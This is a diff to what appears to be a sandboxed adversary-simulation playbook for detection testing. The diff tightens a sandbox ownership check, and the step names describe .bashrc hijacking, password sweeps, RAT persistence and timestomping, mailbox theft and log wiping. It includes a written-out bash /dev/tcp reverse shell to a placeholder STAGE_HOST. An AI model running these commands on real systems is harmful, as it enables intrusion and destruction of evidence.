@@ -200,7 +200,7 @@ steps:
     name: "Hijack .bashrc with a sudo alias logging to Solarwinds.StatusLog.txt; sweep files for cleartext passwords"
     command: |
       L=/tmp/cortexsim-mp-024
-      [ -d "$L" ] && [ ! -L "$L" ] && [ -O "$L" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      [ "$(stat -c %F:%u:%a "$L" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
       H="$L/home/www-data"
       mkdir -p "$H"
       printf '# ~/.bashrc\nalias ll="ls -l"\nexport DB_PASSWORD=cortexsim-lab-not-a-secret\n' > "$H/.bashrc"
@@ -233,7 +233,7 @@ steps:
     name: "Stage SysGoRAT under a benign name with sys-update.service and five-minute cron persistence, timestomped"
     command: |
       L=/tmp/cortexsim-mp-024
-      [ -d "$L" ] && [ ! -L "$L" ] && [ -O "$L" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      [ "$(stat -c %F:%u:%a "$L" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
       mkdir -p "$L/usr/local/bin" "$L/etc/systemd/system" "$L/var/spool/cron"
       cp /bin/sleep "$L/usr/local/bin/sys-control-client"
       cp /bin/sleep "$L/usr/local/bin/pip2.7"
@@ -259,7 +259,7 @@ steps:
     name: "In-memory reverse shells to STAGE_HOST - bash /dev/tcp, mkfifo + nc, python socket"
     command: |
       L=/tmp/cortexsim-mp-024
-      [ -d "$L" ] && [ ! -L "$L" ] && [ -O "$L" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      [ "$(stat -c %F:%u:%a "$L" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
       SH="${STAGE_HOST:-127.0.0.1}"
       SP="${STAGE_PORT:-4444}"
       timeout 3 bash -c "bash -i >& /dev/tcp/$SH/$SP 0>&1" 2>/dev/null
@@ -440,7 +440,7 @@ steps:
     name: "Enumerate qmail Maildirs, search headers for social-media mail, archive mailboxes with zip_mails.sh"
     command: |
       L=/tmp/cortexsim-mp-024
-      [ -d "$L" ] && [ ! -L "$L" ] && [ -O "$L" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      [ "$(stat -c %F:%u:%a "$L" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
       M="$L/var/qmail/mailnames/gov-lab.example"
       for u in press.office minister.desk; do mkdir -p "$M/$u/Maildir/cur"; for i in 1 2 3; do printf 'From: notifications@social.example\nTo: %s@gov-lab.example\nSubject: Your account login code %s\n\nsynthetic cortexsim message\n' "$u" "$i" > "$M/$u/Maildir/cur/170000000$i.cortexsim:2,S"; done; done
       find "$L/var/qmail/mailnames" -path '*/Maildir/cur/*' -type f > "$L/maildir-index.txt"
@@ -509,7 +509,7 @@ steps:
     name: "Anti-forensics - discover the XDR agent (no kill), wipe lab logs and shell history, timestomp, RedTeamOps2025 decoy"
     command: |
       L=/tmp/cortexsim-mp-024
-      [ -d "$L" ] && [ ! -L "$L" ] && [ -O "$L" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      [ "$(stat -c %F:%u:%a "$L" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
       H="$L/home/www-data"
       mkdir -p "$L/var/log/nginx" "$H" "$L/tmp-stage"
       for f in auth.log syslog mail.log nginx/access.log; do printf 'cortexsim lab log line from %s\n' "${STAGE_HOST:-127.0.0.1}" > "$L/var/log/$f"; done
@@ -544,7 +544,7 @@ steps:
     name: "Verify evidence removal (grep wiped logs for the operator IP); correlation stitches both legs"
     command: |
       L=/tmp/cortexsim-mp-024
-      [ -d "$L" ] && [ ! -L "$L" ] && [ -O "$L" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      [ "$(stat -c %F:%u:%a "$L" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $L is missing or not ours: step-01 did not complete" >&2; exit 1; }
       SH="${STAGE_HOST:-127.0.0.1}"
       grep -rl "$SH" "$L/var/log" > "$L/verify.out"
       test ! -s "$L/verify.out"
